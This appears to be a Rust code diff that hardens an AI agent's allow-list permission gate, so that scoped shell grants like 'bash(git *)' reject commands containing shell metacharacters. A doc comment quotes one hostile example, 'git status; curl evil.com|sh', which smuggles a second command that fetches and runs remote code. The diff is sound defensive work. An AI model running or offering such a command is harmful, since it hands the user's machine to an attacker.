@@ -12,7 +12,8 @@ use std::sync::Arc;
 
 use async_trait::async_trait;
 use conway_core::agent::{PermissionDecision, PermissionRequest};
-use conway_core::ports::PermissionGate;
+use conway_core::permission_pattern::contains_shell_metacharacters;
+use conway_core::ports::{PermissionGate, RenderKind};
 use globset::{Glob, GlobMatcher};
 
 use crate::config::schema::{PermissionMode, PermissionsConfig};
@@ -50,10 +51,44 @@ enum ArgMatcher {
 }
 
 impl ArgMatcher {
+    /// Raw glob/literal match, with no metacharacter gate. Used for
+    /// **deny** entries only: mirroring [`conway_core::permission_pattern::
+    /// PatternRule::matches_deny`], a deny match must stay hard to evade, so
+    /// it deliberately matches identically regardless of what `value`
+    /// contains.
     fn matches(&self, value: &str) -> bool {
         match self {
             ArgMatcher::Any => true,
             ArgMatcher::Glob(g) => g.is_match(value),
+            ArgMatcher::Literal(pattern) => pattern == value,
+        }
+    }
+
+    /// Whether this entry, used as an **allow** entry, authorizes `value`
+    /// under `render_kind`.
+    ///
+    /// [`ArgMatcher::Any`] (a bare `tool_name` entry) is unconditional --
+    /// `--allowed-tools bash` already grants unrestricted access, and gating
+    /// it would reject every documented example for zero security gain.
+    ///
+    /// [`ArgMatcher::Glob`] (a `tool_name(pattern)` entry) additionally
+    /// requires [`contains_shell_metacharacters`] to be false on `value`
+    /// whenever `render_kind` is [`RenderKind::ShellCommand`] -- mirroring
+    /// [`conway_core::permission_pattern::PatternRule::matches_render`]'s
+    /// ordering exactly (the metacharacter check runs before, and gates,
+    /// the pattern comparison). Without this, a scoped grant like
+    /// `bash(git *)` -- read by an operator as "may run git commands" --
+    /// silently also authorizes `git status; curl evil.com|sh`, because a
+    /// raw `globset::Glob`'s `*` matches shell metacharacters too.
+    fn allows(&self, value: &str, render_kind: RenderKind) -> bool {
+        match self {
+            ArgMatcher::Any => true,
+            ArgMatcher::Glob(g) => {
+                if render_kind == RenderKind::ShellCommand && contains_shell_metacharacters(value) {
+                    return false;
+                }
+                g.is_match(value)
+            }
             ArgMatcher::Literal(pattern) => pattern == value,
         }
     }
@@ -157,6 +192,13 @@ fn matched_value(arguments: &serde_json::Value) -> String {
 ///
 /// See [`matched_value`] for a caveat on which tools a `denied` glob pattern
 /// reliably matches against.
+///
+/// An **allowed** `tool_name(pattern)` entry never matches a value carrying
+/// a shell metacharacter (`;`, `|`, `&`, backtick, ...) when the tool's own
+/// `render_kind` is `ShellCommand` -- see [`ArgMatcher::allows`]. A **bare**
+/// `tool_name` entry is unaffected: it already grants unrestricted access to
+/// that tool, so there is nothing narrower for the metacharacter check to
+/// protect.
 pub struct AllowListGate {
     allowed: Vec<Entry>,
     denied: Vec<Entry>,
@@ -197,7 +239,7 @@ impl PermissionGate for AllowListGate {
         let allowed = self
             .allowed
             .iter()
-            .any(|e| e.tool == tool && e.matcher.matches(&value));
+            .any(|e| e.tool == tool && e.matcher.allows(&value, req.render_kind));
         if allowed {
             PermissionDecision::AllowOnce
         } else {
